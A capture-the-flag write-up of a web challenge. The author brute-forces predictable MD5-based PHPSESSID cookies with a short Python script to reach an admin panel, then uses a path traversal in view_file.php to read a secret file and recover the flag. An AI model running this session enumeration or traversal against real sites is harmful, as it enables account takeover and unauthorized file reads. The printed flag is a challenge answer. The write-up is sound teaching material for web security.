
**Title :** DeepDive Interception
**Author :** Astek
**Category :** Web
**Solves :** <40
**Points :** 300
**Provided files :** None
**Description :**

```
Listen carefully to what you hear. 
Intercept communications in transit and learn as much as possible.
```

# Write Up

### 1. Understanding how to application works

At first, a page containing only one button `Intercept` is displayed to us.
![](../../../attachments/Pasted%20image%2020241025201509.png)

If we click the button, we can intercept message from Anderson. 
**Do not read it. It is not useful.**
At the bottom, we can see a `DISCARD` button.
![](../../../attachments/Pasted%20image%2020241025201651.png)

If we click on `DISCARD0, we are back to the start.
![](../../../attachments/Pasted%20image%2020241025201719.png)

At first I was like, *huh... there is no attack surface ?*

So I tried to understand a little bit more what was done in the backend and where could be the vuln.

### Finding the vulnerable spot

So, I opened my best BurpSuite and started messing with those 3 pages.

I quickly discovered that when we click on `INTERCEPT` the following happens :
1. GET /index.php answers with 302 to /home.php
2. GET /home.php answers with 302 to /guest.php
3. GET /guest.php

**But hey ??? I've never seen that `home.php` before**

Here is the full `/home.php` request
![](../../../attachments/Pasted%20image%2020241025202933.png)

I was like, *this is weird right ? Why would the application requires a router ? How does the router know where to redirects me ?*

The only answer I found was the `PHPSESSID` cookie. 
So, I tried messing with it. I removed it, replaced it, tried some SQL injection on it but I had no clue of what it could be.

So, as a last breath before going right to an other web challenge, I sent the cookie over https://crackstation.net/ and WOW !!

![](../../../attachments/Pasted%20image%2020241025203513.png)

My first thought was *is that normal ? How are formed PHPSESSIDs by default ?*
After some research, I discovered that **no, this is not default behaviour...**

So, I made a script to bruteforce the first 1000 PHPSESSIDs. 

```python
import requests
import hashlib

url = "http://challenges.challenge-ecw.eu:33499/home.php"
headers = {
	"User-Agent": "Mozilla/5.0", 
	"Accept-Language": "en-US,en;q=0.5", 
	"Accept-Encoding": "gzip, deflate, br", 
	"Referer": "http://challenges.challenge-ecw.eu:33499/", 
	"Connection": "keep-alive", 
	"Upgrade-Insecure-Requests": "1", 
	"Priority": "u=0, i"
}

for k in range(1000) : 

    print(f"Testing for {k}")

    phpsessid = hashlib.md5(str(k).encode()).hexdigest()
    cookies = {"PHPSESSID": phpsessid}

    response = requests.get(url, headers=headers, cookies=cookies)

    if len(response.text) != 5892 : # Default response for invalid token
        print(response.text)
```

**With PHPSESSID = MD5(500), the servers responds with an other page** (i.e. `PHPSESSID=cee631121c2ec9232f3a2f028ad5c89b`)

### Admin panel

![](../../../attachments/Pasted%20image%2020241025205148.png)

I clicked on `Recipe` and found the first part of the flag

![](../../../attachments/Pasted%20image%2020241025205506.png)

Then, I clicked `Back to home` and then to `Profile`
Here is what is displayed in `/profile.php`

![](../../../attachments/Pasted%20image%2020241025205820.png)

I uploaded a profile picture and clicked on it.

This sent me to `http://challenges.challenge-ecw.eu:38722/view_file.php?file=profile.png`

I tried removing the `profile.png` and it listed files in the upload folder.

![](../../../attachments/Pasted%20image%2020241025210041.png)

Clicking to `profile.png` redirected me to `http://challenges.challenge-ecw.eu:38722/view_file.php?folder=uploads&file=profile.png`

I juste add to go to `http://challenges.challenge-ecw.eu:38722/view_file.php?folder=../` to view that there was a `super_secret.txt` exposed

![](../../../attachments/Pasted%20image%2020241025210157.png)

Clicking on it gave me the second part of the flag.

![](../../../attachments/Pasted%20image%2020241025210230.png)

## Flag

`ECW{S@cUr3_yOur_C0ok13s_6Jw91wsMmD}`